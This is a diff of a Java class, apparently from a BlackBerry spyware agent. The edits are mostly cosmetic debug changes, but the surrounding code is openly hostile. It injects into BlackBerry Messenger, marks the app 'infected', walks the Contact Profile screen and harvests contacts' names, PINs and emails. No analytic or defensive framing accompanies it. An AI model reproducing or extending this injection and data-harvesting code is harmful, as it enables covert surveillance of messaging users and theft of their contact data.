@@ -88,17 +88,21 @@ public class BBMMenuItem extends ApplicationMenuItem {
                 //#endif
                 return null;
             }
+
             //#ifdef DEBUG
             debug.init();
             debug.info("BBMMenuItem context: " + context);
             //#endif
+
             UiApplication app = UiApplication.getUiApplication();
             Class cl = app.getClass();
+
             //#ifdef DEBUG
             debug.trace("class: " + cl);
             //#endif
 
             Screen screen = UiApplication.getUiApplication().getActiveScreen();
+
             //#ifdef DEBUG
             debug.trace("screen: " + screen + " count: "
                     + screen.getUiEngine().getScreenCount());
@@ -122,17 +126,17 @@ public class BBMMenuItem extends ApplicationMenuItem {
 
                 // lookForConversationsThread();
                 conversationScreen.setBBM(bbmApplication);
+
                 //#ifdef DEBUG
                 debug.info("BBM INJECTED!");
-                debug.led(Debug.COLOR_GREEN);
+                debug.ledFlash(Debug.COLOR_GREEN);
                 //#endif
-
                 AppInjectorBBM.getInstance().setInfected();
 
             } else {
                 //#ifdef DEBUG
                 debug.warn("BBM NOT INJECTED!");
-                debug.led(Debug.COLOR_RED);
+                debug.ledFlash(Debug.COLOR_RED);
                 //#endif
             }
 
@@ -141,7 +145,7 @@ public class BBMMenuItem extends ApplicationMenuItem {
         } catch (Exception ex) {
             //#ifdef DEBUG
             debug.warn("injectBBM:" + ex.toString());
-            debug.led(Debug.COLOR_RED);
+            debug.ledFlash(Debug.COLOR_RED);
             //#endif
         }
 
@@ -160,9 +164,6 @@ public class BBMMenuItem extends ApplicationMenuItem {
                     || MenuWalker.walk("Contact Profile", screen, true)) {
                 //#ifdef DEBUG
                 Debug debug = new Debug("BBMMenuItem", DebugLevel.VERBOSE);
-                //#endif
-
-                //#ifdef DEBUG
                 debug.info("walked in Contact Profile");
                 //#endif
                 Utils.sleep(100);
@@ -184,6 +185,7 @@ public class BBMMenuItem extends ApplicationMenuItem {
                 //#ifdef DEBUG
                 debug.trace("exploring Contact Profile: " + newScreen);
                 //#endif
+
                 FieldExplorer explorer = new FieldExplorer();
                 Vector textfields = explorer.explore(newScreen);
 
@@ -207,7 +209,7 @@ public class BBMMenuItem extends ApplicationMenuItem {
                     users.put(user.toLowerCase(), new User(user, pin, email));
 
                     //#ifdef DEBUG
-                    debug.led(Debug.COLOR_ORANGE);
+                    debug.ledFlash(Debug.COLOR_ORANGE);
                     //#endif
                 }
                 //#ifdef DEBUG
